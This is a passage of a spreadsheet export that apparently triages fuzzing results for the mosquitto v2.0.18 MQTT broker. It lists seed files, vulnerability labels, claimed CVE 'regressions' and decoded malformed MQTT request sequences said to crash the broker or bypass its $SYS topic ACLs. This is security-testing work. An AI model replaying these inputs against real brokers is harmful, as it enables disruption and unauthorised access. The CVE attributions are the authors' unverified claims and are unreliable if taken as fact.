          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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3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32">
      <c r="A332" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B332" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C332" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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32" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0042 ===\u000a大小: 688B (报告+请求数据)\u000a请求数据: 160B\u000a\u000a---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MQTT请求序列(160B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3958 Topics=[''(零长度!QoS=2)] | raw_header=82310f76000012686f6d652f2b2f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=75B | raw_header=3c6a001d245359532f62726f6b65722f\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F3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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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3">
      <c r="A333" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B333" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C333" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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33" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c0 ===\u000a大小: 637B (报告+请求数据)\u000a请求数据: 74B\u000a\u000a---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MQTT请求序列(74B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=17 Topics=[''(零长度!QoS=1), 'very/deep/topic/level1/level2/level3/level4'(QoS=2)] | raw_header=82330011000001002b766572792f6465\u000aMsg[2]: PUBLISH Topic='a/b/c/d/e' QoS=1 retain=True payload='\x00\x12.6Cã' | raw_header=3b110009612f622f632f642f6500122e\u000aMsg[3]: TYPE0  | raw_header=0b00</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J33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3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34">
      <c r="A334" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B334" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C334" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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34" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c2 ===\u000a大小: 852B (报告+请求数据)\u000a请求数据: 142B\u000a\u000a---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MQTT请求序列(142B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1530 Topics=[''(零长度!QoS=1)] | raw_header=822605fa00001d245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=67B | raw_header=3962001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=efe5\u000a(尾部2B): efe5</f>
        <v/>
      </c>
      <c r="F3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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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5">
      <c r="A335" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B335" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C335" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(149B)\u000a4.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35" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0244 ===\u000a大小: 704B (报告+请求数据)\u000a请求数据: 149B\u000a\u000a---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MQTT请求序列(149B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=290 Topics=[''(零长度!QoS=3)] | raw_header=8231012200002b766572792f64656570\u000aMsg[2]: PUBLISH Topic='$share/grp1/test/+' QoS=2 retain=False payload_len=75B | raw_header=3c5f00122473686172652f677270312f\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F3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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J33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3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36">
      <c r="A336" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B336" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C336" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(152B)\u000a4.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336" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0246 ===\u000a大小: 853B (报告+请求数据)\u000a请求数据: 152B\u000a\u000a---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MQTT请求序列(152B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=31 Topics=[''(零长度!QoS=2)] | raw_header=8210001f00000a746573742f746f7069\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=109B | raw_header=3882010013245359532f62726f6b6572\u000aMsg[3]: PINGREQ  | raw_header=c2</f>
        <v/>
      </c>
      <c r="F3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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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7">
      <c r="A337" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B337" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C337" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(148B)\u000a4.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337" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c4 ===\u000a大小: 1081B (报告+请求数据)\u000a请求数据: 148B\u000a\u000a---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MQTT请求序列(148B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3904 Topics=[''(零长度!QoS=1)] | raw_header=820b0f40000001740000017400\u000aMsg[2]: PUBLISH Topic='t' QoS=0 retain=True payload_len=127B | raw_header=3182010001745b015908000174090013\u000aMsg[3]: (不完整,2B) raw=e0ee\u000a(尾部2B): e0ee</f>
        <v/>
      </c>
      <c r="F3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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J33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3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38">
      <c r="A338" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B338" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C338" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(116B)\u000a4.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338" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c6 ===\u000a大小: 1432B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MQTT请求序列(116B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=f296001014f4ed4d5404e4000de3002c\u000aMsg[2]: SUBSCRIBE PacketID=3781 Topics=['$share/g3/home/+/temperature'(QoS=2), ''(零长度!QoS=2)] | raw_header=82240ec5001c2473686172652f67332f\u000aMsg[3]: PUBLISH Topic='test/topic' QoS=2 retain=True payload='\x0eÆ`\x93®ÀâNí\x9bU\x12A|Ø\x05á \x17¦M\x1f\x81\x0bgì`0wE9*d' | raw_header=3d2d000a746573742f746f7069630ec6\u000aMsg[4]: (不完整,6B) raw=00782a000164\u000a(尾部6B): 00782a000164</f>
        <v/>
      </c>
      <c r="F3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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J33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39">
      <c r="A339" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000009,sev:4,cat:03c7</t>
        </is>
      </c>
      <c r="B339" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C339" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000009,sev:4,cat:03c7)中的REQUEST DATA提取出来(64B)\u000a4.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0x03c7\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E339" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c7 ===\u000a大小: 1541B (报告+请求数据)\u000a请求数据: 64B\u000a\u000a---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MQTT请求序列(64B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=14s Will=YES [持久会话] | raw_header=101500044d51545404e4000e00002c01\u000aMsg[4]: SUBSCRIBE  | raw_header=8000\u000aMsg[5]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=820b00010000101500044d5154\u000aMsg[6]: PUBREC PacketID=58368 | raw_header=5404e4000e00\u000aMsg[7]: (不完整,16B) raw=002c0163820b0001000680000b040100\u000a(尾部16B): 002c0163820b0001000680000b040100</f>
        <v/>
      </c>
      <c r="F3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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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3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0">
      <c r="A340" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000004,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B340" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C340" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000004,sev:3,cat:0101)中的REQUEST DATA提取出来(160B)\u000a4.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40" s="2">
        <f>== 种子标识: id:000004,sev:3,cat:0101 ===\u000a大小: 687B (报告+请求数据)\u000a请求数据: 160B\u000a\u000a---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MQTT请求序列(160B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v130 ClientID=''(10B) clean_session=False keepalive=3198s [持久会话] | raw_header=101500044d51545482100c7e00000a74\u000aMsg[2]: PUBREL PacketID=56 | raw_header=696300387c00122473686172652f6772\u000aMsg[3]: (不完整,36B) raw=2f74656d7065726174757265a0b26d6f05f3da1f13f7dfdd197f352a0402003cf7096130\u000a(尾部36B): 2f74656d7065726174757265a0b26d6f05f3da1f13f7dfdd197f352a0402003cf7096130</f>
        <v/>
      </c>
      <c r="F3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4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40" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J34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4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41">
      <c r="A341" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000005,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B341" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C341" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(94B)\u000a4.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1" s="2">
        <f>== 种子标识: id:000005,sev:3,cat:0002 ===\u000a大小: 438B (报告+请求数据)\u000a请求数据: 94B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(94B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v64 ClientID=''(7936B) clean_session=False keepalive=35843s Will=YES [持久会话] | raw_header=101500044d51545440458c0387411f00\u000aMsg[2]: (不完整,71B) raw=726f6b65722f76657273696f6e260012686f6d652f2b2f74656d7065726174757265001424736861\u000a(尾部71B): 726f6b65722f76657273696f6e260012686f6d652f2b2f74656d706572617475726500142473686172652f677270322f7365</f>
        <v/>
      </c>
      <c r="F3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4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41" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J34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34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2">
      <c r="A342" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000006,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B342" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C342" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(309B)\u000a4.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2" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0002 ===\u000a大小: 645B (报告+请求数据)\u000a请求数据: 309B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(309B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(4352B) clean_session=True keepalive=60s Will=YES [自动清理会话] | raw_header=10990100044d5154540506003c281100\u000aMsg[2]: SUBSCRIBE PacketID=30 Topics=['home/+/status'(QoS=2)] | raw_header=8212001e000d686f6d652f2b2f737461\u000aMsg[3]: PUBLISH Topic='devi\x82Y\x00@\x00\x00\x13$SYS/brok' QoS=0 retain=False payload='er/ve' | raw_header=301b0014646576698259004000001324\u000aMsg[4]: (不完整,104B) raw=7273696f6e2e001d245359532f62726f6b65722f636c69656e74732f636f6e6e656374656414001d\u000a(尾部104B): 7273696f6e2e001d245359532f62726f6b65722f636c69656e74732f636f6e6e656374656414001d245359532f62726f6b65</f>
        <v/>
      </c>
      <c r="F3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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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4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3">
      <c r="A343" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000007,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B343" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C343" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(231B)\u000a4.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3" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0002 ===\u000a大小: 613B (报告+请求数据)\u000a请求数据: 231B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(231B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2842 Topics=[] | raw_header=8290010b1a440b8ba6b96426001d2453\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=60B | raw_header=30510013245359532f62726f6b65722f\u000aMsg[3]: PUBREC  | raw_header=5f</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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4">
      <c r="A344" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000007,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B344" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C344" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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44" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0082 ===\u000a大小: 740B (报告+请求数据)\u000a请求数据: 167B\u000a\u000a---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MQTT请求序列(167B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=142B | raw_header=3da3010013245359532f62726f6b6572\u000aMsg[2]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F3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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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5">
      <c r="A345" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000007,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B345" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C345" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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45" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0101 ===\u000a大小: 601B (报告+请求数据)\u000a请求数据: 75B\u000a\u000a---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MQTT请求序列(75B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=65407s Will=YES [持久会话] | raw_header=101300044d515454040dff7f00006675\u000aMsg[2]: SUBSCRIBE PacketID=39425 Topics=['senst/oY\x00\x051b\x02'(QoS=0)] | raw_header=82129a01000d73656e73742f6f590005\u000aMsg[3]: PUBLISH Topic='sens,r/4 \x00\x0ccmd/li' QoS=0 retain=False payload='gkt/' | raw_header=3017001173656e732c722f3420000c63\u000aMsg[4]: (不完整,9B) raw=86590005316205e000\u000a(尾部9B): 86590005316205e000</f>
        <v/>
      </c>
      <c r="F3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4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45" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J34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4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46">
      <c r="A346" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000007,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B346" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C346" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(193B)\u000a4.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46" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0040 ===\u000a大小: 600B (报告+请求数据)\u000a请求数据: 193B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(193B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: SUBSCRIBE PacketID=3653 Topics=[''(零长度!QoS=2)] | raw_header=82270e4500000a746573742f746f7069\u000aMsg[3]: PUBLISH Topic='a/b/c/d/e' QoS=1 retain=False payload_len=136B | raw_header=3a93010009612f622f632f642f650e46</f>
        <v/>
      </c>
      <c r="F3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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J34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4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47">
      <c r="A347" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000007,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B347" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C347" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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47" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0042 ===\u000a大小: 721B (报告+请求数据)\u000a请求数据: 141B\u000a\u000a---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MQTT请求序列(141B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1125 Topics=[''(零长度!QoS=2)] | raw_header=8210046500000a746573742f746f7069\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload_len=98B | raw_header=3a770013245359532f62726f6b65722f\u000aMsg[3]: PINGREQ  | raw_header=c400</f>
        <v/>
      </c>
      <c r="F3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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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4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48">
      <c r="A348" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000007,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B348" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C348" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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48" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c0 ===\u000a大小: 819B (报告+请求数据)\u000a请求数据: 250B\u000a\u000a---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MQTT请求序列(250B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3236 Topics=[''(零长度!QoS=3)] | raw_header=82500ca400002b766572792f64656570\u000aMsg[2]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=0 retain=True payload_len=118B | raw_header=39a301002b766572792f646565702f74\u000aMsg[3]: (不完整,2B) raw=151f\u000a(尾部2B): 151f</f>
        <v/>
      </c>
      <c r="F3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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J34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4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49">
      <c r="A349" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000007,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B349" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C349" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(100B)\u000a4.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0x0244\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E349" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0244 ===\u000a大小: 968B (报告+请求数据)\u000a请求数据: 100B\u000a\u000a---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MQTT请求序列(100B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=[] | raw_header=820b0001000961666c6e65745f\u000aMsg[2]: PUBREL  | raw_header=6300\u000aMsg[3]: SUBSCRIBE PacketID=3 Topics=[''(零长度!QoS=0), ''(零长度!QoS=2)] | raw_header=820b0003000000000006746573\u000aMsg[4]: PUBLISH Topic='\x00\u0009test/da' QoS=2 retain=False payload='bt_c0\x82\x0b' | raw_header=341200090009746573742f646162745f\u000aMsg[5]: TYPE0  | raw_header=0003000000\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: SUBSCRIBE  | raw_header=8000\u000aMsg[8]: TYPE0  | raw_header=0000\u000aMsg[9]: PUBLISH Topic=' \u0009tesï/da' QoS=2 retain=False payload='tap\x02hel' | raw_header=34120009a009746573ef2f6461746170\u000aMsg[10]: (不完整,21B) raw=ff746573742f64617461000268656c6c6f50020069\u000a(尾部21B): ff746573742f64617461000268656c6c6f50020069</f>
        <v/>
      </c>
      <c r="F3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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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4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50">
      <c r="A350" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000007,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B350" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C350" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(67B)\u000a4.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50" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c4 ===\u000a大小: 793B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SUBSCRIBE PacketID=4028 Topics=[''(零长度!QoS=1), '$SYS/broker/clients/connected'(QoS=0), 't'(QoS=1)] | raw_header=82290fbc000001001d245359532f6272\u000aMsg[2]: PUBLISH Topic='a/b/c/d/e' QoS=2 retain=True payload='\x0f½¥E\x0bi\x1b\x12§q' | raw_header=35150009612f622f632f642f650fbda5\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=ee</f>
        <v/>
      </c>
      <c r="F3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50" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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5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51">
      <c r="A351" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B351" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C351" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(62B)\u000a4.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51" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0002 ===\u000a大小: 475B (报告+请求数据)\u000a请求数据: 62B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(62B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload='\x00D\x9f\x84ÇU\x17w\x0c@bÁk\x9fE`\x19&gt;äHMÚ\x86\x1c\x9eNõÃ(\x94µ\x14³' | raw_header=32360013245359532f62726f6b65722f\u000aMsg[2]: TYPE0  | raw_header=0002c000\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F3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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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5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52">
      <c r="A352" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000008,sev:3,cat:000a</t>
        </is>
      </c>
      <c r="B352" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C352" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
